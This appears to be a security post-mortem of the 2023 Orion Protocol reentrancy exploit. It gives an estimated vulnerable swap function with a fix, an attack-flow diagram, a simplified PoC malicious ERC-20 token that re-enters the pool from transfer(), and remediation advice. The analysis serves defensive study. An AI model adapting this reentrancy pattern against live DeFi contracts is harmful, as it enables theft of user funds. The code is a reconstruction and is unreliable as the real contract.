# Orion Protocol — Reentrancy Attack via Fake Token Analysis

| Field | Details |
|------|------|
| **Date** | 2023-02-02 |
| **Protocol** | Orion Protocol |
| **Chain** | Ethereum / BSC |
| **Loss** | ~3M USD |
| **Attacker** | Unknown |
| **Attack Tx (ETH)** | [0xa6f63fcb...](https://etherscan.io/tx/0xa6f63fcb6bec8818864d96a5b1bb19e8bd85ee37b2cc916412e720988440b2aa) |
| **Attack Tx (BSC)** | [0xfb153c57...](https://bscscan.com/tx/0xfb153c572e304093023b4f9694ef39135b6ed5b2515453173e81ec02df2e2104) |
| **Vulnerable Contract** | Orion Pool V2 |
| **Root Cause** | Deployed a fake ERC-20 token to trigger a reentrancy vulnerability in OrionPool |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-02/Orion_exp.sol) |

---
## 1. Vulnerability Overview

Orion Protocol's OrionPool is an order book-based DEX. The attacker deployed a malicious ERC-20 token and embedded reentrancy code inside its `transfer()` function. When Orion interacted with this fake token, reentrancy was triggered, enabling duplicate withdrawals. This follows a pattern similar to the Defrost Finance (2022-12-23) and DFX Finance (2022-11-10) incidents.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable OrionPool: balance update occurs after external token transfer
interface OrionPoolV2Factory {
    function createPair(address tokenA, address tokenB) external;
}

// Estimated vulnerable implementation
function swapTokens(address tokenIn, uint256 amountIn, address tokenOut) external {
    // 1. Request tokenIn from the user
    IERC20(tokenIn).transferFrom(msg.sender, address(this), amountIn);
    // ❌ If tokenIn is malicious, reentrancy occurs during transfer

    // 2. Calculate and send tokenOut (executed twice on reentry)
    uint256 amountOut = calculateOutput(amountIn);
    IERC20(tokenOut).transfer(msg.sender, amountOut);
    // ❌ External call can repeat without state update
}

// ✅ Fix: CEI + ReentrancyGuard
function swapTokens(address tokenIn, uint256 amountIn, address tokenOut)
    external
    nonReentrant  // ✅ Blocks reentrancy
{
    // ✅ Checks - Effects - Interactions order
    uint256 amountOut = calculateOutput(amountIn);
    userBalance[msg.sender][tokenOut] += amountOut;  // State update first
    IERC20(tokenIn).transferFrom(msg.sender, address(this), amountIn);
    IERC20(tokenOut).transfer(msg.sender, amountOut);
}
```

### On-chain Original Code

Source: Bytecode decompilation

```solidity
// Root cause: Deployed a fake ERC-20 token to trigger a reentrancy vulnerability in OrionPool
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─1─▶ Deploy malicious ERC-20 token (ATK)
  │       Embed reentrancy code inside transfer()
  │
  ├─2─▶ OrionPoolV2Factory.createPair(ATK, USDT)
  │       Create ATK-USDT pair
  │
  ├─3─▶ Add liquidity to OrionPool using ATK token
  │       or initiate a swap using ATK
  │
  ├─4─▶ OrionPool calls ATK.transfer()
  │       │
  │       └─▶ Reentrancy triggered inside ATK.transfer():
  │               Re-calls the same OrionPool function
  │               Receives duplicate USDT with balance not yet updated
  │
  └─5─▶ Drain stolen USDT → realize profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
// Malicious ERC-20 token
contract MaliciousToken is IERC20 {
    IOrionPool orionPool;
    bool attacking = false;

    function transfer(address to, uint256 amount) external returns (bool) {
        // Standard transfer handling
        balances[to] += amount;
        balances[msg.sender] -= amount;

        // ❌ Trigger reentrancy when called from OrionPool
        if (msg.sender == address(orionPool) && !attacking) {
            attacking = true;
            // Reenter OrionPool: re-invoke the same function
            orionPool.swapOrDeposit(/* same parameters */);
            attacking = false;
        }
        return true;
    }
}

// Attack contract
function testExploit() public {
    // 1. Interact with OrionPool using the malicious token
    maliciousToken.approve(address(orionPool), type(uint256).max);

    // 2. Initiate swap → maliciousToken.transfer() → reentrancy → receive duplicate USDT
    orionPool.swap(address(maliciousToken), address(USDT), swapAmount);
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Reentrancy Attack (Reentrancy via Malicious Token) |
| **Attack Vector** | Deploy malicious ERC-20 token + reentrancy |
| **Impact Scope** | Entire OrionPool liquidity |
| **DASP Classification** | Reentrancy |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow |

## 6. Remediation Recommendations

1. **Token Whitelist**: Maintain an allowlist of tokens that OrionPool accepts.
2. **ReentrancyGuard Required**: Apply `nonReentrant` to all fund movement functions.
3. **CEI Pattern**: Update internal state before making external token calls.

## 7. Lessons Learned

- DEXes that accept arbitrary ERC-20 tokens are vulnerable to reentrancy attacks via malicious tokens.
- Defrost (2022-12), DFX (2022-11), and Orion (2023-02) all share the same pattern — a reused attack vector.
- DEXes that allow permissionless creation of new token pairs require particular caution.